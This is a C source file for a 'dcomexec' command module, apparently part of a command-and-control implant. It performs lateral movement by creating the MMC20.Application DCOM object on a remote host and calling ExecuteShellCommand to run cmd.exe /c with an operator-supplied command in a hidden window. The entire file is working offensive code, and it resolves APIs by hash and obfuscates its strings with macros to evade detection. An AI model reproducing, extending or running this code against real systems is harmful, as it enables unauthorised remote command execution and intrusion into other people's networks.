#include "config.h"
#ifdef INCLUDE_CMD_DCOMEXEC

#include "commands.h"
#include "common.h"

// dcomexec <host> <command>: lateral movement via MMC20.Application DCOM.
// CoCreateInstanceEx(CLSID_MMC20, CLSCTX_REMOTE_SERVER) -> Documents -> ActiveView
// -> ExecuteShellCommand(Command, Directory, Parameters, WindowState).
// Fire-and-forget: command runs on the remote host, no output capture.
// COM APIs are not in the instance Win32 table - resolve dynamically from
// ole32.dll/oleaut32.dll via LoadLibraryA + resolve_function.

static const GUID CLSID_MMC20 = { 0x49B2791A, 0xB1AE, 0x4C90, { 0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89 } };
static const GUID LOCAL_IID_IDispatch = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const GUID LOCAL_IID_NULL = { 0x00000000, 0x0000, 0x0000, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

typedef HRESULT (WINAPI *fnCoInitializeEx)(LPVOID, DWORD);
typedef VOID    (WINAPI *fnCoUninitialize)(VOID);
typedef HRESULT (WINAPI *fnCoCreateInstanceEx)(const CLSID*, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI*);
typedef HRESULT (WINAPI *fnCoInitializeSecurity)(PSECURITY_DESCRIPTOR, LONG, VOID*, VOID*, DWORD, DWORD, VOID*, DWORD, VOID*);
typedef BSTR    (WINAPI *fnSysAllocString)(const OLECHAR*);
typedef VOID    (WINAPI *fnSysFreeString)(BSTR);

struct IDispatchVtbl_s {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(VOID*, REFIID, VOID**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(VOID*);
    ULONG   (STDMETHODCALLTYPE *Release)(VOID*);
    VOID*   GetTypeInfoCount;
    VOID*   GetTypeInfo;
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(VOID*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(VOID*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
};
struct IDispatch_s { IDispatchVtbl_s* lpVtbl; };

VOID cmd_dcomexec(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, cmd_len = 0;
    char* host = parser_string(args, &host_len);
    char* command = parser_string(args, &cmd_len);

    if (!host || host_len == 0) {
        package_add_string(inst, response, XSTR("No hostname provided"));
        response->is_error = TRUE;
        return;
    }
    if (!command || cmd_len == 0) {
        package_add_string(inst, response, XSTR("No command provided"));
        response->is_error = TRUE;
        return;
    }

    // Load COM libraries (not pre-resolved in inst->Win32)
    HMODULE h_ole32 = inst->Win32.LoadLibraryA(XSTR("ole32.dll"));
    // combase first: ole32 forwards CoInitializeEx/CoInitializeSecurity etc. to
    // combase.dll; resolving a forwarded export yields a string, not code
    HMODULE h_combase = inst->Win32.LoadLibraryA(XSTR("combase.dll"));
    HMODULE h_oleaut32 = inst->Win32.LoadLibraryA(XSTR("oleaut32.dll"));
    if (!h_ole32 || !h_oleaut32) {
        package_add_string(inst, response, XSTR("Failed to load COM libraries"));
        response->is_error = TRUE;
        return;
    }

    fnCoInitializeEx        pCoInitializeEx = (fnCoInitializeEx)resolve_function(h_ole32, hash_string_djb2(XSTR("CoInitializeEx")));
    if (!pCoInitializeEx) pCoInitializeEx = (fnCoInitializeEx)resolve_function(h_combase, hash_string_djb2(XSTR("CoInitializeEx")));
    fnCoUninitialize        pCoUninitialize = (fnCoUninitialize)resolve_function(h_ole32, hash_string_djb2(XSTR("CoUninitialize")));
    if (!pCoUninitialize) pCoUninitialize = (fnCoUninitialize)resolve_function(h_combase, hash_string_djb2(XSTR("CoUninitialize")));
    fnCoCreateInstanceEx    pCoCreateInstanceEx = (fnCoCreateInstanceEx)resolve_function(h_ole32, hash_string_djb2(XSTR("CoCreateInstanceEx")));
    if (!pCoCreateInstanceEx) pCoCreateInstanceEx = (fnCoCreateInstanceEx)resolve_function(h_combase, hash_string_djb2(XSTR("CoCreateInstanceEx")));
    fnCoInitializeSecurity  pCoInitializeSecurity = (fnCoInitializeSecurity)resolve_function(h_ole32, hash_string_djb2(XSTR("CoInitializeSecurity")));
    if (!pCoInitializeSecurity) pCoInitializeSecurity = (fnCoInitializeSecurity)resolve_function(h_combase, hash_string_djb2(XSTR("CoInitializeSecurity")));
    fnSysAllocString        pSysAllocString = (fnSysAllocString)resolve_function(h_oleaut32, hash_string_djb2(XSTR("SysAllocString")));
    fnSysFreeString         pSysFreeString = (fnSysFreeString)resolve_function(h_oleaut32, hash_string_djb2(XSTR("SysFreeString")));

    if (!pCoInitializeEx || !pCoUninitialize || !pCoCreateInstanceEx ||
        !pSysAllocString || !pSysFreeString) {
        package_add_string(inst, response, XSTR("Failed to resolve COM APIs"));
        response->is_error = TRUE;
        return;
    }

    pCoInitializeEx(NULL, 0);
    if (pCoInitializeSecurity) {
        pCoInitializeSecurity(NULL, -1, NULL, NULL, 4, 3, NULL, 0, NULL);
    }

    wchar_t w_host[256] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, host, (int)host_len, w_host, 255);

    COSERVERINFO si;
    es_memset(&si, 0, sizeof(si));
    si.pwszName = w_host;

    MULTI_QI mqi;
    es_memset(&mqi, 0, sizeof(mqi));
    mqi.pIID = &LOCAL_IID_IDispatch;

    // CLSCTX_REMOTE_SERVER(0x4) | CLSCTX_ACTIVATE_32_BIT_SERVER(0x10)
    HRESULT hr = pCoCreateInstanceEx(&CLSID_MMC20, NULL, 0x14, &si, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr) || !mqi.pItf) {
        pCoUninitialize();
        package_add_string(inst, response, XSTR("CoCreateInstanceEx MMC20 failed - check DCOM perms"));
        response->is_error = TRUE;
        return;
    }

    IDispatch_s* pApp = (IDispatch_s*)mqi.pItf;

    // Document -> ActiveView -> ExecuteShellCommand
    wchar_t* doc_name = XWSTR(L"Document");
    LPOLESTR doc_names[] = { doc_name };
    DISPID doc_dispid;
    hr = pApp->lpVtbl->GetIDsOfNames(pApp, LOCAL_IID_NULL, doc_names, 1, LOCALE_SYSTEM_DEFAULT, &doc_dispid);
    if (FAILED(hr)) {
        pApp->lpVtbl->Release(pApp);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("GetIDsOfNames Document failed"));
        response->is_error = TRUE;
        return;
    }

    DISPPARAMS dp_empty;
    es_memset(&dp_empty, 0, sizeof(dp_empty));
    VARIANT vt_doc;
    vt_doc.vt = VT_EMPTY;
    hr = pApp->lpVtbl->Invoke(pApp, doc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_doc, NULL, NULL);
    if (FAILED(hr) || vt_doc.vt != VT_DISPATCH || !vt_doc.pdispVal) {
        pApp->lpVtbl->Release(pApp);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("Invoke Document failed"));
        response->is_error = TRUE;
        return;
    }

    IDispatch_s* pDoc = (IDispatch_s*)vt_doc.pdispVal;

    wchar_t* av_name = XWSTR(L"ActiveView");
    LPOLESTR av_names[] = { av_name };
    DISPID av_dispid;
    hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, LOCAL_IID_NULL, av_names, 1, LOCALE_SYSTEM_DEFAULT, &av_dispid);
    if (FAILED(hr)) {
        pDoc->lpVtbl->Release(pDoc);
        pApp->lpVtbl->Release(pApp);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("GetIDsOfNames ActiveView failed"));
        response->is_error = TRUE;
        return;
    }

    VARIANT vt_view;
    vt_view.vt = VT_EMPTY;
    hr = pDoc->lpVtbl->Invoke(pDoc, av_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_view, NULL, NULL);
    if (FAILED(hr) || vt_view.vt != VT_DISPATCH || !vt_view.pdispVal) {
        pDoc->lpVtbl->Release(pDoc);
        pApp->lpVtbl->Release(pApp);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("Invoke ActiveView failed"));
        response->is_error = TRUE;
        return;
    }

    IDispatch_s* pView = (IDispatch_s*)vt_view.pdispVal;

    wchar_t* esc_name = XWSTR(L"ExecuteShellCommand");
    LPOLESTR esc_names[] = { esc_name };
    DISPID esc_dispid;
    hr = pView->lpVtbl->GetIDsOfNames(pView, LOCAL_IID_NULL, esc_names, 1, LOCALE_SYSTEM_DEFAULT, &esc_dispid);
    if (FAILED(hr)) {
        pView->lpVtbl->Release(pView);
        pDoc->lpVtbl->Release(pDoc);
        pApp->lpVtbl->Release(pApp);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("GetIDsOfNames ExecuteShellCommand failed"));
        response->is_error = TRUE;
        return;
    }

    // ExecuteShellCommand(Command, Directory, Parameters, WindowState)
    // -> cmd.exe /c <command>, WindowState 7 = hidden (MinNoFocus)
    wchar_t* w_cmd = XWSTR(L"cmd.exe");
    wchar_t* w_empty = XWSTR(L"");
    wchar_t* w_hidden = XWSTR(L"7");

    wchar_t w_params[2048] = { L'/', L'c', L' ', 0 };
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, command, (int)cmd_len, w_params + 3, 2044);

    VARIANT vargs[4];
    vargs[3].vt = VT_BSTR; vargs[3].bstrVal = pSysAllocString(w_cmd);      // Command
    vargs[2].vt = VT_BSTR; vargs[2].bstrVal = pSysAllocString(w_empty);    // Directory
    vargs[1].vt = VT_BSTR; vargs[1].bstrVal = pSysAllocString(w_params);   // Parameters
    vargs[0].vt = VT_BSTR; vargs[0].bstrVal = pSysAllocString(w_hidden);   // WindowState = hidden

    DISPPARAMS dp;
    dp.rgvarg = vargs;
    dp.rgdispidNamedArgs = NULL;
    dp.cArgs = 4;
    dp.cNamedArgs = 0;
    VARIANT vt_result;
    vt_result.vt = VT_EMPTY;

    hr = pView->lpVtbl->Invoke(pView, esc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_METHOD, &dp, &vt_result, NULL, NULL);

    for (int i = 0; i < 4; i++) pSysFreeString(vargs[i].bstrVal);

    pView->lpVtbl->Release(pView);
    pDoc->lpVtbl->Release(pDoc);
    pApp->lpVtbl->Release(pApp);
    pCoUninitialize();

    if (SUCCEEDED(hr)) {
        package_add_string(inst, response, XSTR("Command executed via DCOM MMC20"));
    } else {
        package_add_string(inst, response, XSTR("DCOM ExecuteShellCommand failed"));
        response->is_error = TRUE;
    }
}

#endif
